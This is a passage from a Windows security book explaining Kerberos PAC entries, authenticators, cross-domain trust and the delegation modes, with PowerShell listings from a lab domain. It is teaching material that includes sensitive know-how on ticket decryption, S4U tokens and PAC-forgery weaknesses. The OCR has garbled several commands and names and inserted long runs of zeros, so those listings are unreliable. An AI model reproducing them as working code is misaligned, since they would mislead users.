Finally, there is an empty session key consisting of all zeros . You'll find a non-empty session key only if the KDC didn't directly authenticate the user and instead used another authentication protocol, such as NTLM. In this case the session key for that sub-authentication protocol will be shown here; however, in most cases it will be empty.

Listing 14-11 shows the next PAC entry, which contains the user's claim attributes.

```bash
<PAC Entry UserClaims>
<ActiveDirectory Clain>
ad://ext/cn:88d7f6d1914512a - String - Alice Roberts
ad://ext/country:88d7f5009df2815 - String - US
ad://ext/department:88d7f500a308ca49 - String - R&D
```

Listing 14-11: The user claims PAC entry

As mentioned in Chapter 4, the Token object exposes these user claims as security attributes, and they can play a role in the access control process, typically through a central access policy. If the target SPN is a computer account rather than a user account, the Kerberos ticket will also include information about the client device in the form of device groups and device claims, as shown in Listing 14-12.

---

```bash
<table><tr><td>&lt;PAC Entry Device&gt;</td></tr><tr><td>Device Name    : MINERAL\GRAPHITE$</td></tr><tr><td>Primary Group  : MINERAL\Domain Computers</td></tr><tr><td>&lt;Groups&gt;</td></tr><tr><td>MINERAL\Domain Computers      - Mandatory, EnabledByDefault, Enabled</td></tr><tr><td>&lt;Domain Groups&gt;</td></tr><tr><td>NT AUTHORITY\Claims Valid      - Mandatory, EnabledByDefault, Enabled</td></tr><tr><td>&lt;Extra Groups&gt;</td></tr><tr><td>Authentication authority asserted identity - Mandatory, EnabledByDefault, Enabled</td></tr><tr><td>&lt;PAC Entry DeviceClaims&gt;</td></tr><tr><td>&lt;ActiveDirectory Claim&gt;</td></tr><tr><td>ad://ext/cn:88d7f6d41914512a - String - GRAPHITE</td></tr><tr><td>ad://ext/operatingSystem:88d7f6d34791d12 - String - Windows Enterprise</td></tr></table>
```

Listing 14-12: The device groups and device claims PAC entries

As with the user claims, you'll typically only find these used in a central access policy. Listing 14-13 shows additional bookkeeping entries.

```bash
<PAC Entry ClientInfo>
Client ID      : 5/12 5:37:40 PM
Client Name    : alice
<PAC Entry UserPrincipalName>
Flags        : None
Name          : alice@mineral.local
DNS Name      : MINERAL_LOCAL
```

Listing 14-13: The client info and UPN PAC entries

The Client ID field should match the user's authentication time.

Listing 14-14 shows a couple of signatures applied to the PAC data to ensure it hasn't been tampered with. Without these signatures, the user could forge their own PAC, adding any groups they would like the LSA to place in their Token object.

```bash
<PAC Entry ServerChecksum>
Signature Type  : HMAC_MD5
Signature      : 7FEA93110C5E193734FF5071EC6B3C5
<PAC Entry KDCChecksum>
Signature Type  : HMAC_SHA1_96_AES_256
Signature      : 9E0689AF7CFE1445EBACBF88
<PAC Entry TicketChecksum>
Signature Type  : HMAC_SHA1_96_AES_256
Signature      : 1F97471A222BBDECEC717BC
```

Listing 14-14: PAC signatures

The first signature covers the entire PAC. However, as the signature fields are embedded inside the PAC, they're replaced with zeros during the

---

signature calculation. This signature is generated using the shared key used to encrypt the ticket.

The second signature is used to verify that the server signature was issued by the KDC. This signature covers only the server and uses the encryption key for the hbkgt user. To verify the signature, the server needs to send it to the KDC, as it doesn't know the encryption key. For performance reasons, it's common to not perform this validation when the server is running as a privileged user such as SYSTEM .

The final signature is calculated from the entire ticket with the PAC removed. The encryption key used for the signature is the one for the kbtgt user. This signature allows the KDC to detect any tampering of the ticket, which the server signature wouldn't cover, as it verifies only the PAC.

## NOTE

Windows has faced multiple security issues related to PAC signature verification. Most notable is CVE-2014-6524, which occurred because the TGS accepted CRC32 as a valid signature mechanism. As CRC32 is not cryptographically secure and can be trivially brute-forced, an attacker could create a valid PAC containing any groups they liked, including the full domain administrator.

Listing 14-15 shows the final component of the decrypted AS-REQ message, the authenticator.

```bash
<Authenticator>
  Client Name    : PRINCIPAL - alice
  Client Realm   : MINERAL_LOCAL
  Client Time    : 5/13 2:15:03 AM
  ❶ Checksum      : GSSAPI
  Channel Binding : 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Listing 14-15: The decrypted AS-REQ authenticator

The authenticator contains some basic user information, as well as a timestamp indicating when it was created on the client that can be used to confirm the request is recent and has not been replayed to the service.

One odd thing you might notice is that a checksum field is present, but it doesn't appear to contain a valid cryptographic hash ❶ . This is because the authenticator has repurposed this field to store additional information, as indicated by the type value GSAPI . By default, this field contains the channel binding for the connection, if specified, and some additional flags. In this case, no channel binding is set, so the Channel Binding field contains all zeros. If you were to specify a ChannelBinding parameter in the same way we did when using NTLM, the field would look something like this:

```bash
Channel Binding : BAD4B8274DC394EDC375CA8ABFD2AEE
```

Kerberos 475

---

The authenticator contains a sub-session key ❸ , which the connection can use going forward. It also contains a randomly generated sequence number ❹ that, along with the timestamp, can thwart replay attacks that attempt to use the same ticket and authenticator. Finally, the authenticator can contain additional authorization data ❸ . In this case, the data specifies the AD_TYPE_NEGOTIATION type, which allows the connection to try to upgrade the encryption algorithm used from RC4 to one of the AES encryption formats.

The GSSAPI type value used in Listing 14-15 represents the Generic Security Services Application Program Interface (GSSAPI) , a general API for implementing network authentication protocols. You would use GSSAPI instead of SSPI on Linux or macOS to perform Kerberos authenction. RFC2743 and RFC2744 define the current version of GSSAPI, while RFC4121 defines the protocol's Kerberos-specific implementation.

SSPI is mostly compatible with GSSAPI, and it's common to find network protocol documentation that refers to the GSSAPI names of the functions to use, especially for encryption and signatures. For example, to encrypt and decrypt data in GSSAPI, you would use the GSS_Wrap and GSS_Unwrap functions, respectively, instead of the SSPI EncryptMessage and DecryptMessage APIs. Similarly, for signature generation and verification, you would use GSS_GetMIC and GSS_VerifyMIC instead of MakeSignature and VerifySignature. As this is a book on Windows security, we won't dwell on the intricacies of GSSAPI any further.

## Decrypting the AP-REP Message

Once we've decrypted the AP-REQ message's ticket and authenticator, we have the key we need to decrypt the AP-REP used for mutual authentication. We do so in Listing 14-16.

```bash
______________________________________________________________________________________________________________________
PS> $sesskey = (Unprotect-LsaAuthToken -Token $ap_rep -Key $key).Ticket.Key
PS> Unprotect-LsaAuthToken -Token $ap_rep -Key $sesskey | Format-LsaAuthToken
<kerberosV5 KRB_AP_REP>
<Encripted Part>
Client Time  : 05-14 01:48:39
<Sub Session Key>
Encryption Type : AES256 CTS HMAC_SHA1_96
Encryption Key : 76F07F4F1FB8CE10C38CFA98F74AF5229C7F626110C6302E4B8780AE91FD3A
Sequence Number : 0x60991818B
```

Listing 14-16: Decrypting the AP-REP message

We first need to get the session key from the decrypted AP-REQ ticket. With that key, we can decrypt the AP-REQ using Unprotect-UsaAuthToken once again. In the output, you can see the newly negotiated session key; in this case, it's been upgraded from RC4 to an AES key. It also includes a sequence number to prevent replay attacks.

476 Chapter 14

---

### USING A PUBLIC KEY IN THE INITIAL AUTHENTICATION

One big weakness of Kerberos, especially for normal users, is its reliance on the password to derive encryption keys. Tickets and associated encrypted data are commonly transferred over insecure networks, so an attacker could easily collect a large body of ciphertext associated with a single user and attempt to crack their password. If they succeed, they'll completely compromise that user's security.

To limit this risk, you can configure Windows Kerberos to use Public Key Initial Authentication (PKINIT). PKINIT relies on public key cryptography to perform the initial session key exchange, rather than using shared encryption keys derived from passwords. The public key cryptography in PKINIT authenticates the user with standard X.509 certificates, which the system typically stores, along with the associated private key, on a smart card that the user must insert into the Windows computer before authenticating.

Rather than encrypting a timestamp with the shared encryption key as part of the pre-authentication data, to prove possession of the key when sending the initial AS-REQ message to the KDC the client uses its public key certificate to sign an identifier, then sends it to the KDC along with a copy of the certificate it used. The KDC can verify the signature, which proves the client's possession of the corresponding private key, and check that the PKI policy allows the certificate (by making sure it has the correct root certificate authority and Extended Key Usages, or EKUs, for example).

If everything checks out, the KDC returns a session key to the client, either by encrypting it using the public key or by using a Diffie-Hellman key exchange. As a result, the initial authentication process never uses the shared encryption key derived from the password. (Of course, many functions in Windows rely on the user's credentials, such as the NT hash, and the PAC in the ticket will contain the NT hash for the client, encrypted in a separate authorization data structure.) You can learn more about the PKINIT implementation in RFC4556.

Next, we'll look at one more topic related to Kerberos service authentication: how it works across domain trust boundaries.

## Cross-Domain Authentication

When discussing domain forests in Chapter 10 I mentioned the concept of trust relationships, in which a trusted domain accepts credentials belonging to a user configuration stored on a different domain. This section discusses how the Kerberos protocol works across domains in the same forest. Although Kerberos authentication can also occur between forests, and with non-Windows Kerberos implementations, we won't cover those complex cases here.

Figure 14-6 shows the basic operations of inter-domain Kerberos authentication between the example MINERAL and SALES domains.

Kerberos   477

---

![Figure](figures/WindowsSecurityInternals_page_508_figure_000.png)

Figure 14-6: An overview of inter-domain Kerberos authentication

The client in the MINERAL domain first requests a service ticket for the http://WEB.SALES SPN . The TGS can't satisfy this request, as the SPN isn't present in its own domain. It checks the global catalog to see if any other domain in the forest has the SPN configured, and finds it in the SALES domain.

The TGS then checks whether it has a trust relationship with the SALES domain, which it does. When a new trust relationship is established between two domains, a shared Kerberos key is configured between the domain controllers in each domain. This key encrypts a referral ticket , which contains the user's information and the requested service, and returns it to the client ❷ . The client then forwards the referral ticket to the TGS in the SALES domain. ❸ . As the ticket is encrypted using a shared inter-domain key, the SALESTGS can decrypt it to verify its contents.

The SALES TGS needs to modify the PAC provided in the referral ticket to add domain-local group memberships for the SALES domain based on the user's existing groups. The TGS will then re-sign the modified PAC and insert it into the service ticket for use by the local service. It can now issue the service ticket for HTTP/WEB.SALES and, using the service's key, return it to the client.

NOTE In complex inter-domain trust relationships, domains shouldn't trust any additional SIDs included in the PAC, as an attacker who has compromised the source domain could generate a PAC containing arbitrary SIDs and then compromise the target

---

domain. Windows implements a SID-filtering mechanism to remove SIDs from the PAC that are deemed dangerous, such as any SIDs for the local domain. The full details of SID filtering are, however, outside the scope of this book.

Finally, the client can use the service ticket to authenticate to the services in the SALES domain . The server receiving the service ticket can use it to build a token based on the modified PAC generated by its domain's TGS.

The domains might need to repeat this process of issuing a referral ticket multiple times if they don't have a direct trust relationship. For example, returning to the example domains from Chapter 10, if a user in the ENGINEERING domain wanted to authenticate to a service in the SALES domain, then the root MINERAL domain would first have to issue a referral ticket. This ticket could then be used to establish a referral ticket for the SALES domain.

In more complex forests consisting of many domains and trees, this multi-hop referral process might lead to poor performance. To remediate this, Windows provides a mechanism to establish a shortcut trust relationship between any two domains in a forest. The domains can use this trust to establish the referral ticket without needing to follow the normal transitive trust path.

We've covered the basics of Kerberos authentication. Now let's move on to deeper topics, starting with how an authenticated user can securely forward their credentials to a service.

## Kerberos Delegation

Delegation enables a service to forward a user's credentials to another service. This is useful because, when a user connects to a service using Kerberos, they do not provide it with their credentials. Instead, they provide a ticket that has been encrypted using the server's shared encryption key. The service could try forwarding the ticket on to another service, but as it won't know the new service's shared encryption key it won't be able to encrypt the ticket, so the new service won't accept it.

The only way to get an encrypted ticket for a new service might seem to be to send a TGS-REQ message to the TGS using a TGT. However, the original service only has a TGT for its own account, not for the user, and without the user's TGT a service can't forward a user's credentials further than specified. This behavior provides an important security measure; if any authentication a user made to a service could be delegated to another service, it would likely be easy to get full administrator access to the domain.

That said, forwarding credentials is a useful feature. For example, let's say you have a corporate network that users can access only from an external network, via a web server. It would be useful if the web server could provide the users' credentials to access the backend systems, such as a database server. One way of solving this issue would be for the web server to request the user's plaintext credentials and then use those to authenticate to the

Kerberos 479

---

domain, which would then provide the user's TGT. In practice, though, this is a terrible idea for security.

Therefore, to make it possible to securely forward credentials, Kerberos implements a defined delegation process. A client can opt in to delegation, allowing a target service to use their identity to request tickets for other network services on their behalf. Windows domains configure delegation on a per-account basis for both users and computers. In the GUI, you'll see the delegation dialog shown in Figure 14 - 7 when inspecting the properties of an account.

![Figure](figures/WindowsSecurityInternals_page_510_figure_002.png)

Figure 14-7: The delegation tab for the GRAPHITE computer account

Figure 14-7 shows three main options for delegation. The first option, the default, disables delegation for the account. The second option, called unconstrained delegation, allows the account to delegate to any other service on the network using the authenticating user's credentials. The third option, known as constrained delegation, allows the user's credentials to be delegated to a fixed set of services defined by a list of permitted SPNs.

Let's dig into the similarities and differences between the two types of delegation and see how they're implemented. In the following sections, we'll modify some of the delegation settings in the Active Directory server. This means that you must perform these operations from a user account that has SeEnableDelegationPrivilege on the domain controller. Typically, only administrators have this privilege, so you should run these examples as a domain administrator.

480    Chapter 14

---

## Unconstrained Delegation

Microsoft introduced unconstrained delegation in Windows 2000 along with the original Windows Kerberos implementation. This Kerberos delegation mechanism requires the client to opt in to providing a copy of their TGT, enabling the service to delegate their credentials. It works only with Kerberos authentication, as the user must have first authenticated to the service using the Kerberos protocol. Figure 14-8 gives an overview of the unconstrained delegation process.

![Figure](figures/WindowsSecurityInternals_page_511_figure_002.png)

Figure 14-8: The unconstrained delegation process

This figure shows a client delegating its credentials through the HTTP service on the server WEB to the database service on the server DB . The client first makes a ticket request to the TGS with its TGT for a normal ticket, using the HTTP/WEB.MINERAL SPN . If the destination service can use delegation, the returned ticket should have the OkAsDelegate flag set, which indicates to the client that it can delegate if it wants to.

The client then makes a second request for a new TGT to send to the HTTP service. The client indicates its intention by specifying the target principal name as the http@user and setting the forwardable and forwarded flags on the TGS-REQ ❸. If delegation is allowed, the TGS will return this new TGT to the client.

The client can then package up the original service ticket and the TGT into the AP-REQ message for the server and send it over HTTP . The AP-REQ must also contain the session key information for the encrypted TGT so that the target service can decrypt it. The Windows APIs enable mutual authentication when delegating credentials, so the server returns an AP-REQ to the client .

Kerberos 481

---

Once the HTTP service has received the AP-REQ, it can get the LSA to give it a token for that user. The LSA will also save the TGT and session key information in the new logon session. When the HTTP service wants to authenticate to the database service, it can impersonate the user's token and start the Kerberos authentication process. This means the user's TGT will be used to request a ticket for SQL/DB.MINERAL from the TGS . Assuming the service meets all the policy requirements, the TGS will return the service ticket , which the LSA will return as a new AP-REQ to pass to the database service , completing the delegation.

As the delegated TGT is sent via the AP-REQ message, we should be able to inspect the delegation process occurring during a local authentication in PowerShell. The authenticating user needs a registered SPN. We'll use the alice user, for whom we added an SPN in "Decrypting the AP-REQ Message" on page 469. First we must enable unconstrained delegation for this user. You can either use the GUI to enable the delegation, or run the following Set-AccountControl PowerShell command as a domain administrator:

```bash
PS> Set-ADAccountControl -Identity alice -TrustedFoxDelegation $true
```

You can verify that delegation has been enabled using the Get-ADUser or Get-ADComputer command (depending on the account type), as shown in Listing 14-17.

```bash
PS> Get-ADUser -Identity alice -Properties TrustedForDelegation |
Select-Object TrustedForDelegation
TrustedForDelegation
----------------------
True
```

Listing 14-17: Querying the user's TrustedForDelegation property

Now let's create a client authentication context and request an AP-REQ message with a delegate ticket (Listing 14-18).

```bash
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $credout -Target
"HTTP/graphite"-RequestAttribute MutualAuth, Delegate
PS> $key = Get-KerberosKey -Password "AlicePassword" -KeyType ARCFOUR_HMAC_MDS
-NameType SRV_INST -Principal "HTTP/graphite@mineral.local"
PS> Unprotect-LsaAuthToken -Token $client.Token -Key $key |
Format-LsaAuthToken
<kerberosVS KRB_AP_REQ>
Options
: MutualAuthRequired
<Ticket>
Ticket Version : 5
Server Name
: SRV_INST - HTTP/graphite
Realm
: MINERAL_LOCAL
Flags
:
Forwardable, Renewable, PreAuthent, OkAsDelegate, EncPARrep
--snip--
Listing 14-18: Requesting an AP-REQ and displaying the delegate ticket
```

---

We must specify both the #uaioAuth and delegate flags ❸ for the LSA to request the delegated TGT. Note that the #dalesleate flag is set in the resulting ticket ❹. This flag exists regardless of whether the client requested delegation, as the LSA combines it with the delegate request attribute to determine whether to request the TGT.

The authenticator stores the new TGT as part of the GSSAPI checksum, as shown in Listing 14-19.

```bash
<Authenticator>
  Client Name   : PRINCIPAL - alice
  Client Realm  : MINERAL.LOCAL
  Client Time    : 5/15 1:51:00 PM
  Checksum     : GSSAPI
  Channel Binding : 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Listing 14-19: The AP-REQ authenticator with the delegated TGT

If you compare this authenticator with the one shown in Listing 14-15, the first difference you should notice is that both the Delegate and Mutual context flags are set ❶.

The delegate flag indicates that a Kerberos Credential (KRB-CRED) structure is packed into the checksum field. Within the KBR-CRED, we find the TGT ticket ❹ . We can tell it's a TGT because it's for the hhsgt principal ❸ . The KBR-CRED structure also contains an extra encrypted part to hold the session keys that go with the TGT ❸ .

If we can complete the authentication, we can receive an impersonation token. The LSA now has enough information for the service to request any service ticket on behalf of the user that provided the delegated TGT, as demonstrated in Listing 14-20.

```bash
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
PS> $server = New-LsaServerContext -CreditHandle $credin
PS> Update-LsaServerContext -Server $server -Client $client
```

Kerberos     483

---

```bash
PS> Use-NtObject($token = Get-LsaAccessToken $server) {
        Format-NtToken $token -Information
    }
    TOKEN INFORMATION
----------------------
    Type        : Impersonation
    Imp level  : Delegation
    --snip--
```

Listing 14-20: Completing the delegation authentication process

Notice that the Token object in Listing 14-20 has the Delegation impersonation level. Certain kernel APIs enforce this impersonation level, including SeCreateClientSecurity, which captures the calling client's token for later use by the impersonateClient kernel API. The SeCreateClientSecurity API takes a Boolean ServerIsRemote parameter. If the parameter is True, the API fails to capture the token if the impersonation level is not Delegation. However, well-known callers such as the SMB do not set the parameter to True. Therefore, the Delegation impersonation level is the de facto equivalent to the Impersonation level for both local and remote access, assuming there are credentials available in the logon session.

## NOTE

In Windows 10 and later, you can enable a feature called Credential Guard that uses virtualization technology to protect the user's credentials, including the Kerberos TGT session key stored by the LSA, from being disclosed to a privileged user reading the memory of the LSASS process. As unconstrained delegation would introduce a mechanism to disclose the TGT session key for a user, it is no longer possible to use it if Credential Guard is enabled.

## Constrained Delegation

Microsoft introduced constrained delegation, also called Service for User (SFU) , in Windows 2003. Its purpose was to fix a security weakness in unconstrained delegation: namely, once a user had delegated credentials to a service, it could impersonate them to any other service in the same domain, even if the services were completely unrelated to the purpose of the original service.

This made any service with unconstrained delegation a good target for attack. If you compromised the service and could convince a privileged user to delegate their credentials to it, you had a good chance of compromising the entire network. Technically a user had to opt in to delegating their credentials, but common client applications such as Internet Explorer did so by default, and always passed the delegate request attribute when setting up the client authentication context.

Microsoft resolved the security weakness by allowing an administrator to specify an explicit list of SPNs that the service could use for delegation. For example, the administrator could limit the HTTP service discussed earlier to delegating only to the database service and nothing else.

484    Chapter 14

---

Constrained delegation can work in three modes:

- ●  Kerberos-only delegation
●  Protocol transition delegation
●  Resource-based delegation
We'll cover each mode in turn in the following sections.

## Kerberos-Only Delegation

Also called Service for User to Proxy (S4U2proxy) in the official documentation, the Kerberos-only delegation mode works in much the same way as unconstrained delegation. It requires the user to authenticate to the intermediate service using Kerberos, as described in Figure 14 - 9 .

![Figure](figures/WindowsSecurityInternals_page_515_figure_005.png)

Figure 14-9: An overview of constrained Kerberos-only delegation

While this looks very similar to Figure 14 - 8 , there are subtle differences. First, the original user requests a normal service ticket for the HTTP service ❶ , not an additional TGT. The user can package this service ticket into an AP-REQ message and send it to the HTTP service ❷ . The HTTP service then wants to delegate the user's authentication to the database service, so it requests a service ticket from the TGS, including its own TGT. It also attaches the user's service ticket for its own service to the TGS-REQ message ❸ .

The TGS inspects the request. If the user's service ticket has the forwardable flag set and the database service is in the list of allowed services for the account making the ticket request, the TGS will use the user's service ticket to the HTTP service to generate a service ticket for the database

---

service . The service can package this ticket and associated information into an AP-REQ message as normal and send it to the database service .

While it might seem as though the user can't control the delegation of their credentials, they could block the delegation by simply choosing not to request a forwardable service ticket. We'll come back to how to unset the Forwardable flag later.

The list of SPNs for services to which an account can delegate is stored in the user's or computer's account entry in Active Directory, in the msDS-AllowedToDelegateTo attribute. You can set this attribute using Set-ADUser or Set-ADComputer in PowerShell, as shown in Listing 14-21.

```bash
PS: $$psn = #("msd-AllowedToDelegateTo ="("CIFS/graphite")) \
PS: #Set-ADUser -Identity alice -Add $psn
```

Listing 14-21: Adding a new msDS-AllowedToDelegateTo entry for the alice account

To query the list of SPNs, use Get-ADUser or Get-ADComputer, as shown in Listing 14-22.

```bash
PS> Get-ADUser -Identity alice -Properties 'msDS-AllowedToDelegateTo' |
Select-Object -Property 'msDS-AllowedToDelegateTo'
msDS-AllowedToDelegateTo
----------------------
{CIFS/graphite}
```

Listing 14-22: Querying the msDS-AllowedToDelegateT o attribute

In this example, we confirm we can delegate to the CIFS/graphite service.

## Protocol Transition Delegation

Requiring end-to-end Kerberos authentication to the domain isn't always feasible. For example, what if the user accessing the HTTP service is on a public network and cannot directly connect to the KDC to get a service ticket? This is where the second type of constrained delegation—protocol transition delegation, referred to as Service for User to Self (SfU2sdf) in the documentation—might be useful. It performs an authentication protocol transition , meaning that the frontend HTTP service can authenticate using its own authentication mechanism, then use that information to construct a service ticket for the database service with the user's domain credentials, without requiring the user to know about Kerberos.

Figure 14 - 10 shows the steps involved in constrained delegation using an authentication protocol transition.

---

![Figure](figures/WindowsSecurityInternals_page_517_figure_000.png)

Figure 14-10: An overview of constrained delegation with an authentication protocol transition

The user first makes a request to the HTTP service and provides authentication credentials . The credentials don't have to be related to the Kerberos credentials we want to use, and the authentication protocol used can be anything, such as basic HTTP authentication. The HTTP service maps the authenticated user to a domain account, then makes a request to the TGS for a service ticket for itself with that domain account's information .

The TGS gathers all of the target user's details (like their group memberships), puts them into the PAC, and sends the service ticket back to the service. Because the ticket is for the service itself, the LSA can decrypt the ticket, extract the PAC, and generate a Token object.

This process might seem dangerous. After all, it lets you request a service ticket out of thin air without requiring any authentication of the user. Believe it or not, this is really how S3U2self works; however, bear in mind that the token generated is only useful for the local system. The LSA can already synthesize a token containing any groups it likes and use it locally, so this doesn't change the security properties of the system.

Unlike with a synthesized local token, though, the LSA has a copy of the S4U2self service ticket. If the service's account is configured for delegation, it can use S4U2proxy with the S4U2self service ticket to request a service ticket for a permitted service ❶ . It can then package this new service ticket in an AP-REQ and use it to authenticate to the database service ❷ .

You can configure SAU2self to be permitted to transition to SAU2proxy by setting the list of permitted SPNs in ns05-AllowedToDelegateTo and setting the user account control flag TrustedToAuthForDelegation to True. You

Karbaros 487

---

saw how to modify the permitted SPNs in Listing 14-21. You can set the TrustedAuthForInlegation flag using the following command:

```bash
PS> Set-ADAccountControl -Identity alice -TrustedToAuthForDelegation $true
```

To query the status of the flag, use Get-ADUser or Get-ADComputer, as shown in Listing 14-23.

```bash
PS> Get-ADUser -Identity alice -Properties TrustedToAuthForDelegation |
Select-Object -Property TrustedToAuthForDelegation
TrustedToAuthForDelegation
------------------------------------
True
```

Listing 14-23: Querying the TrustedT oAuthForDelegation flag

You'll note we do not check whether we can request the initial $A$U2self ticket. As mentioned earlier, this is only an issue for the local system's security. Without $A$U2proxy configured, the computer can't use the credentials in a network request. In fact, any user on Windows can request an $A$U token using !talegolog-user or via the get-NTtoken command, even if not connected to an enterprise network.

Listing 14-24 shows that we're currently running as the alive user. Let's try requesting a token for another user.

```bash
PS> Show-NtTokenEffective
MINERAL\alice
PS> $token = Get-NtToken -S4U -User bob -Domain MINERAL
PS> Format-NtToken $token
MINERAL\bob
PS> Format-NtToken $token -Information
TOKEN INFORMATION
----------------------
Type      : Impersonation
Imp Level  : Identification
--snip--
```

Listing 14-24: Requesting an S4U2self token as a normal user

Here, we use Get-NTToken with the $Id parameter to request a token for the bob user ❶ . Notice we don't need to specify a password. We can confirm that the token is really for bob by formatting it ❷ .

This design would have a massive local security hole if the LSA didn't restrict the token to Identification level, which prevents a normal user from being able to use the token to access secured resources . The only way to get an Impersonation-level token is to have SetChrPrivileges enabled, which only the local SYSTEM account has by default. Thus, it's typical to configure TrustedIoAuthForDelegation on the computer account used by the SYSTEM account, so it can impersonate the SAI2Self object at the Impersonation level, then get the LSA to query for the SUI2proxy ticket.

---

## Resource-Based Delegation

The final constrained delegation type, resource-based delegation, was introduced in Windows Server 2012. It doesn't change the underlying delegation process outlined previously; instead, it changes the condition under which a forwardable ticket gets issued for a service. Rather than basing this decision only on the account requesting the delegated ticket, it also considers the target SPN being requested.

The msDS-AllowedToActOnBehalfOftheirIdentity attribute on a user or computer object controls resource-based delegation. This attribute is a security descriptor that contains an ACE for every account the user can delegate to. You can set it using the Set-ADUser or Set-ADComputer PowerShell command by specifying distinguished names of the users or computers to the PrincipalAllowedToBelegateToAccount parameter. In Listing 14-25, we add the GRAPHITE computer account to the list of accounts to which the alice user can delegate.

```bash
P5> Get-ADUser -Identity alice
     -PrincipalsAllowedToDelegateToAccount (Get-ADComputer GRAPHITE)
  P5> Get-ADUser -Identity alice -Properties
     PrincipalsAllowedToDelegateToAccount |
     Select-Object PrincipalsAllowedToDelegateToAccount
     PrincipalsAllowedToDelegateToAccount
  ♦ {CN=GRAPHITE,,CN=Computers,DC=mineral,DC=com)
  P5> $name = msDS-AllowedToActOnMehalfOfOtherIdentity"|
